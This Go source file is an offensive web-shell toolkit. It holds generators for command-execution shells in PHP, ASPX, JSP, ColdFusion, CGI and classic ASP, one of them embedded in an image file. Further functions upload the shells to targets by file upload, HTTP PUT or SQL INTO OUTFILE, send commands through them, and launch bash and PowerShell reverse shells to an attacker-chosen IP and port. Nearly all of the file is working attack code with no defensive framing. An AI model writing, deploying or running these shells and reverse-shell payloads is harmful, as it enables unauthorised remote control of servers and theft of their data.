package websecurity

import (
	"fmt"
	"os"
	"strings"
)

func GeneratePHPShell(cmdParam, outputFile string) (string, error) {
	cmd := throttledExec("cmd", "/C", fmt.Sprintf("echo ^<?php system($_GET['%s']); ^?^> > \"%s\"", cmdParam, outputFile))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write php shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("PHP web shell written to %s (param: %s)", outputFile, cmdParam), nil
}

func GeneratePHPCompactShell(cmdParam, outputFile string) (string, error) {
	cmd := throttledExec("cmd", "/C", fmt.Sprintf("echo ^<?=`$_GET[%s]`?^> > \"%s\"", cmdParam, outputFile))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write compact php shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Compact PHP web shell written to %s", outputFile), nil
}

func GeneratePHPWebShellWithBypass(cmdParam, outputFile string) (string, error) {
	content := fmt.Sprintf("<?php\n$cmd = $_REQUEST['%s'];\nif(isset($cmd)){\n\techo \"<pre>\".shell_exec($cmd).\"</pre>\";\n}\n?>", cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write php bypass shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("PHP bypass web shell written to %s", outputFile), nil
}

func GeneratePHPShellWithAuth(cmdParam, password, outputFile string) (string, error) {
	content := fmt.Sprintf("<?php if($_GET['pass']=='%s'){system($_GET['%s']);}else{header('HTTP/1.0 403');echo 'Denied';}?>", password, cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write php auth shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Password-protected PHP web shell written to %s", outputFile), nil
}

func GeneratePHPRCENetcat(cmdParam, outputFile string) (string, error) {
	content := fmt.Sprintf("<?php $c=$_GET['%s'];if(function_exists('system')){system($c);}elseif(function_exists('exec')){exec($c,$o);echo join(\"\\n\",$o);}elseif(function_exists('shell_exec')){echo shell_exec($c);}else{echo 'No exec';}?>", cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write php rce shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("PHP multi-function RCE web shell written to %s", outputFile), nil
}

func GeneratePHPFileManager(outputFile string) (string, error) {
	cmd := throttledExec("cmd", "/C", fmt.Sprintf("echo ^<?php $p=$_SERVER['DOCUMENT_ROOT'];if(isset($_GET['p'])){$p=$_GET['p'];}foreach(scandir($p)as$f){echo($f=='.'||$f=='..')?\"[DIR] \":\"[FILE] \";echo \"$f\\n\";}if(isset($_GET['f'])){echo file_get_contents($_GET['f']);}?^> > \"%s\"", outputFile))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write php file manager: %w: %s", err, string(out))
	}
	return fmt.Sprintf("PHP file manager written to %s", outputFile), nil
}

func GeneratePHPMySQLShell(cmdParam, dbHost, dbUser, dbPass, outputFile string) (string, error) {
	content := fmt.Sprintf("<?php $c=$_GET['%s'];$m=mysqli_connect('%s','%s','%s');if(!$m){die('no db');}if(stripos($c,'select')===0){$r=mysqli_query($m,$c);while($w=mysqli_fetch_assoc($r)){print_r($w);}}else{echo system($c);}mysqli_close($m);?>", cmdParam, dbHost, dbUser, dbPass)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write php mysql shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("PHP MySQL web shell written to %s", outputFile), nil
}

func GeneratePHPImageShell(imageFile, outputFile, cmdParam string) (string, error) {
	payload := fmt.Sprintf("<?php system($_GET['%s']); ?>", cmdParam)
	data, err := os.ReadFile(imageFile)
	if err != nil {
		return "", fmt.Errorf("read image: %w", err)
	}
	stripped := strings.TrimRight(string(data), "\x00\r\n ")
	if err := os.WriteFile(outputFile, []byte(stripped+"\n"+payload), 0644); err != nil {
		return "", fmt.Errorf("write image shell: %w", err)
	}
	return fmt.Sprintf("PHP web shell embedded in image: %s -> %s", imageFile, outputFile), nil
}

func GenerateASPXShell(cmdParam, outputFile string) (string, error) {
	content := fmt.Sprintf("<%%@ Page Language=\"C#\" %%><%%@ Import Namespace=\"System.Diagnostics\" %%><script runat=\"server\">void Page_Load(object s,EventArgs e){string c=Request[\"%s\"];if(c!=null){Process p=new Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+c;p.Start();Response.Write(\"<pre>\"+p.StandardOutput.ReadToEnd()+\"</pre>\");}}</script>", cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write aspx shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("ASPX web shell written to %s", outputFile), nil
}

func GenerateASPXPostShell(outputFile string) (string, error) {
	cmd := throttledExec("cmd", "/C", fmt.Sprintf("echo ^<%%@ Page Language=\"Jscript\"%%^>^<%%eval(Request.Item[\"cmd\"],\"unsafe\");%%^> > \"%s\"", outputFile))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write aspx post shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("ASPX POST web shell written to %s", outputFile), nil
}

func GenerateASPXFileBrowser(cmdParam, outputFile string) (string, error) {
	content := fmt.Sprintf("<%%@ Page Language=\"C#\" %%><%%@ Import Namespace=\"System.IO\" %%><script runat=\"server\">void Page_Load(){string p=Request[\"%s\"]??Server.MapPath(\".\");foreach(string d in Directory.GetDirectories(p)){Response.Write(\"[DIR] \"+d+\"<br>\");}foreach(string f in Directory.GetFiles(p)){Response.Write(\"[FILE] \"+f+\"<br>\");}}</script>", cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write aspx browser: %w: %s", err, string(out))
	}
	return fmt.Sprintf("ASPX file browser written to %s", outputFile), nil
}

func GenerateJSPShell(cmdParam, outputFile string) (string, error) {
	content := fmt.Sprintf("<%%@ page import=\"java.io.*\" %%><%%String c=request.getParameter(\"%s\");if(c!=null){Process p=Runtime.getRuntime().exec(c);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l+\"<br>\");}}%%>", cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write jsp shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("JSP web shell written to %s", outputFile), nil
}

func GenerateCFMShell(cmdParam, outputFile string) (string, error) {
	content := fmt.Sprintf("<cfexecute name=\"cmd.exe\" arguments=\"/c #URL.%s#\" outputfile=\"C:\\temp\\out.txt\"></cfexecute>", cmdParam)
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write cfm shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("CFM web shell written to %s", outputFile), nil
}

func GenerateCGIShell(cmdParam, outputFile string) (string, error) {
	content := "#!/bin/sh\necho \"Content-Type: text/html\"\necho \"\"\necho \"<pre>\"\neval $QUERY_STRING 2>&1\necho \"</pre>\""
	psCmd := fmt.Sprintf("[System.IO.File]::WriteAllText('%s','%s')", outputFile, strings.ReplaceAll(content, "'", "''"))
	cmd := throttledExec("powershell", "-NoP", "-NonI", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write cgi shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("CGI web shell written to %s", outputFile), nil
}

func GenerateASPUnicodeShell(cmdParam, outputFile string) (string, error) {
	cmd := throttledExec("cmd", "/C", fmt.Sprintf("echo ^<%%Dim c:c=Request(\"%s\"):Execute(c)%%^> > \"%s\"", cmdParam, outputFile))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("write asp shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("ASP web shell written to %s", outputFile), nil
}

func DeployWebShellViaUpload(targetURL, localFile, remoteField, uploadEndpoint string) (string, error) {
	cmd := throttledExec("curl", "-s", "-k", "-F", fmt.Sprintf("%s=@%s", remoteField, localFile), uploadEndpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("upload shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Web shell uploaded to %s\n%s", uploadEndpoint, strings.TrimSpace(string(out))), nil
}

func DeployWebShellViaPUT(targetURL, localFile string) (string, error) {
	cmd := throttledExec("curl", "-s", "-k", "-X", "PUT", "--data-binary", fmt.Sprintf("@%s", localFile), targetURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("put shell: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Web shell PUT to %s\n%s", targetURL, strings.TrimSpace(string(out))), nil
}

func DeployWebShellViaSQLINTOUTFILE(shellFile, sqlEndpoint, uploadPath string) (string, error) {
	data, err := os.ReadFile(shellFile)
	if err != nil {
		return "", fmt.Errorf("read shell: %w", err)
	}
	hexPayload := fmt.Sprintf("%x", data)
	sql := fmt.Sprintf("SELECT 0x%s INTO OUTFILE '%s'", hexPayload, uploadPath)
	cmd := throttledExec("curl", "-s", "-k", "-X", "POST", "-d", fmt.Sprintf("query=%s", sql), sqlEndpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sql outfile: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Web shell deployed via INTO OUTFILE to %s\n%s", uploadPath, strings.TrimSpace(string(out))), nil
}

func WebShellConnect(shellURL, cmdParam, command string) (string, error) {
	cmd := throttledExec("curl", "-s", "-k", fmt.Sprintf("%s?%s=%s", shellURL, cmdParam, command))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("connect shell: %w: %s", err, string(out))
	}
	return strings.TrimSpace(string(out)), nil
}

func WebShellInteractive(shellURL, cmdParam string) (string, error) {
	cmds := []string{"whoami", "hostname", "ipconfig", "systeminfo", "dir C:\\Users\\"}
	var results []string
	for _, c := range cmds {
		out, err := WebShellConnect(shellURL, cmdParam, c)
		if err != nil {
			results = append(results, fmt.Sprintf("%s: error - %v", c, err))
		} else {
			results = append(results, fmt.Sprintf("> %s\n%s", c, out))
		}
	}
	return strings.Join(results, "\n---\n"), nil
}

func WebShellReverseLinux(shellURL, cmdParam, ip, port string) (string, error) {
	payload := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
	cmd := throttledExec("curl", "-s", "-k", fmt.Sprintf("%s?%s=%s", shellURL, cmdParam, payload))
	_, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("reverse shell: %w", err)
	}
	return fmt.Sprintf("Reverse shell sent to %s, listen on %s:%s", shellURL, ip, port), nil
}

func WebShellReverseWindows(shellURL, cmdParam, ip, port string) (string, error) {
	psCode := fmt.Sprintf("$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$st=([text.encoding]::ASCII).GetBytes('PS> ');$s.Write($st,0,$st.Length);$s.Flush();$d2=$d;try{$d2=iex $d 2>&1|Out-String}catch{$_|Out-String};$sb=([text.encoding]::ASCII).GetBytes($d2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()", ip, port)
	payload := fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -C \"%s\"", psCode)
	cmd := throttledExec("curl", "-s", "-k", fmt.Sprintf("%s?%s=%s", shellURL, cmdParam, payload))
	_, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("reverse shell: %w", err)
	}
	return fmt.Sprintf("PS reverse shell sent to %s, listen on %s:%s", shellURL, ip, port), nil
}

func WebShellFindOnServer(targetURL, shellName string) (string, error) {
	paths := []string{
		fmt.Sprintf("%s/%s", targetURL, shellName),
		fmt.Sprintf("%s/uploads/%s", targetURL, shellName),
		fmt.Sprintf("%s/images/%s", targetURL, shellName),
		fmt.Sprintf("%s/assets/%s", targetURL, shellName),
		fmt.Sprintf("%s/content/%s", targetURL, shellName),
		fmt.Sprintf("%s/files/%s", targetURL, shellName),
	}
	var results []string
	for _, path := range paths {
		cmd := throttledExec("curl", "-s", "-k", "-o", "/dev/null", "-w", "%{http_code}", path)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		code := strings.TrimSpace(string(out))
		if code == "200" || code == "403" {
			results = append(results, fmt.Sprintf("[FOUND] %s (HTTP %s)", path, code))
		}
	}
	if len(results) == 0 {
		return fmt.Sprintf("No web shells found at common paths on %s", targetURL), nil
	}
	return strings.Join(results, "\n"), nil
}

func ListWebShellTemplates() (string, error) {
	return `Available Web Shell Templates:
  php_simple - Basic PHP system($_GET['cmd']) shell
  php_compact - Minimal PHP short-form shell
  php_bypass - PHP shell with REQUEST + shell_exec
  php_auth - Password-protected PHP shell
  php_rce_all - PHP multi-function RCE shell
  php_filemanager - PHP file browser
  php_mysql - PHP MySQL query shell
  php_image - PHP shell embedded in image
  aspx_cmd - ASPX C# Process.Start shell
  aspx_post - ASPX JScript eval POST shell
  aspx_browser - ASPX file browser
  jsp_cmd - JSP Runtime.exec shell
  cfm_cmd - ColdFusion cfexecute shell
  cgi_sh - CGI-BIN shell script
  asp_classic - Classic ASP Execute shell

Deployment: upload, put, sql_outfile
Post-Exploitation: connect, interactive, reverse_linux, reverse_windows, find`, nil
}

func GenerateWebShellFromTemplate(templateName, outputFile string) (string, error) {
	switch templateName {
	case "php_simple":
		return GeneratePHPShell("cmd", outputFile)
	case "php_compact":
		return GeneratePHPCompactShell("c", outputFile)
	case "php_bypass":
		return GeneratePHPWebShellWithBypass("cmd", outputFile)
	case "php_auth":
		return GeneratePHPShellWithAuth("cmd", "secret", outputFile)
	case "php_rce_all":
		return GeneratePHPRCENetcat("cmd", outputFile)
	case "php_filemanager":
		return GeneratePHPFileManager(outputFile)
	case "php_mysql":
		return GeneratePHPMySQLShell("cmd", "localhost", "root", "", outputFile)
	case "aspx_cmd":
		return GenerateASPXShell("cmd", outputFile)
	case "aspx_post":
		return GenerateASPXPostShell(outputFile)
	case "aspx_browser":
		return GenerateASPXFileBrowser("dir", outputFile)
	case "jsp_cmd":
		return GenerateJSPShell("cmd", outputFile)
	case "cfm_cmd":
		return GenerateCFMShell("cmd", outputFile)
	case "cgi_sh":
		return GenerateCGIShell("cmd", outputFile)
	case "asp_classic":
		return GenerateASPUnicodeShell("cmd", outputFile)
	default:
		return "", fmt.Errorf("unknown template: %s", templateName)
	}
}
